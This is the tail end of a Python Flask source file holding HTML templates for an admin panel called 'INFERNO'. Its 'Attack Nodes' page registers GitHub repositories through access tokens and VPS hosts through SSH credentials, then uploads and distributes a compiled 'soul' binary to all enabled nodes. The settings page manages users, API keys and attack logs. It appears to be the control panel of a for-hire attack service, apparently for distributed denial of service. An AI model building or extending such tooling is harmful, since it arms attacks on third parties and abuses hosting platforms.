<body><div class="container"><div class="glass-card"><h2>Attack Nodes</h2><a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
<div class="row g-4"><div class="col-md-6"><div class="card bg-dark"><div class="card-header">➕ Add GitHub Node</div><div class="card-body"><form method="POST" action="/admin/nodes/add_github"><input type="text" name="name" placeholder="Node Name" class="form-control mb-2" required><input type="text" name="github_token" placeholder="GitHub Token" class="form-control mb-2" required><input type="text" name="github_repo" placeholder="Repo Name (default: InfernoCore)" class="form-control mb-2"><div class="form-check"><input type="checkbox" name="enabled" class="form-check-input" checked> Enabled</div><button type="submit" class="btn btn-primary mt-2">Add GitHub Node</button></form></div></div></div>
<div class="col-md-6"><div class="card bg-dark"><div class="card-header">➕ Add VPS Node</div><div class="card-body"><form method="POST" action="/admin/nodes/add_vps" enctype="multipart/form-data"><input type="text" name="name" placeholder="Node Name" class="form-control mb-2" required><input type="text" name="vps_host" placeholder="VPS Host (IP)" class="form-control mb-2" required><input type="number" name="vps_port" placeholder="Port" class="form-control mb-2" value="22"><input type="text" name="vps_username" placeholder="Username" class="form-control mb-2" required><input type="password" name="vps_password" placeholder="Password" class="form-control mb-2"><div class="mb-2"><label>SSH Private Key (.pem)</label><input type="file" name="vps_key_file" class="form-control" accept=".pem,.key"></div><div class="form-check"><input type="checkbox" name="enabled" class="form-check-input" checked> Enabled</div><button type="submit" class="btn btn-primary mt-2">Add VPS Node</button></form></div></div></div></div>
<div class="card bg-dark mt-4"><div class="card-header">📤 Distribute Binary</div><div class="card-body"><form method="POST" action="/admin/upload_binary" enctype="multipart/form-data"><input type="file" name="binary" class="form-control bg-dark text-white" required><button type="submit" class="btn btn-warning mt-2">Upload & Distribute</button></form><small>Upload compiled 'soul' binary – sent to all enabled nodes.</small></div></div>
<div class="table-responsive mt-4"><table class="table"><thead><tr><th>Name</th><th>Type</th><th>Enabled</th><th>Status</th><th>Binary</th><th>Details</th><th>Actions</th></tr></thead><tbody>{% for n in nodes %}<tr><td>{{ n.name }}</td><td>{{ n.node_type }}</td><td>{% if n.enabled %}✔{% else %}✘{% endif %}</td><td class="{% if n.last_status == 'online' %}status-online{% else %}status-offline{% endif %}">{{ n.last_status }}</td><td>{% if n.binary_present %}✓{% else %}✗{% endif %}</td><td>{% if n.node_type == 'github' %}{{ n.github_repo }}{% else %}{{ n.vps_host }}:{{ n.vps_port }}{% endif %}</td><td><form method="POST" action="/admin/nodes/{{ n.id }}/check" style="display:inline"><button class="btn btn-sm btn-info">Check</button></form> <form method="POST" action="/admin/nodes/{{ n.id }}/toggle" style="display:inline"><button class="btn btn-sm btn-warning">Toggle</button></form> <form method="POST" action="/admin/nodes/{{ n.id }}/delete" style="display:inline" onsubmit="return confirm('Delete node?')"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></div></body></html>
'''

ADMIN_SETTINGS_HTML = '''
<!DOCTYPE html>
<html><head><title>Admin Settings • INFERNO</title><meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{background:#07080a; color:#fff; padding:20px;}
.glass-card{background:rgba(17,20,27,0.45);border-radius:24px;padding:20px;margin-bottom:20px;}
.btn-danger{background:#ff3355;}.btn-warning{background:#ffaa00; color:#000;}
</style>
</head>
<body><div class="container"><div class="glass-card"><h2>Admin Settings</h2>
<form method="POST"><div class="mb-3"><label>Change Admin Password</label><input type="password" name="new_admin_password" class="form-control bg-dark text-white" placeholder="New password (min 6 chars)" required></div><button type="submit" class="btn btn-primary">Update Password</button></form>
<hr><h3>Storage Management</h3><div class="row"><div class="col-md-3 mb-2"><form method="POST" onsubmit="return confirm('Clear ALL users?')"><input type="hidden" name="clear_users" value="1"><button type="submit" class="btn btn-danger w-100">Clear Users ({{ stats.users }})</button></form></div>
<div class="col-md-3 mb-2"><form method="POST" onsubmit="return confirm('Clear ALL API keys?')"><input type="hidden" name="clear_api_keys" value="1"><button type="submit" class="btn btn-danger w-100">Clear API Keys ({{ stats.api_keys }})</button></form></div>
<div class="col-md-3 mb-2"><form method="POST" onsubmit="return confirm('Clear ALL attack logs?')"><input type="hidden" name="clear_attack_logs" value="1"><button type="submit" class="btn btn-warning w-100">Clear Attack Logs ({{ stats.attack_logs }})</button></form></div>
<div class="col-md-3 mb-2"><form method="POST" onsubmit="return confirm('Clear ALL attack nodes?')"><input type="hidden" name="clear_nodes" value="1"><button type="submit" class="btn btn-danger w-100">Clear Nodes ({{ stats.nodes }})</button></form></div></div>
<a href="/admin/dashboard" class="btn btn-secondary mt-3">← Back</a></div></div></body></html>
'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)), debug=False)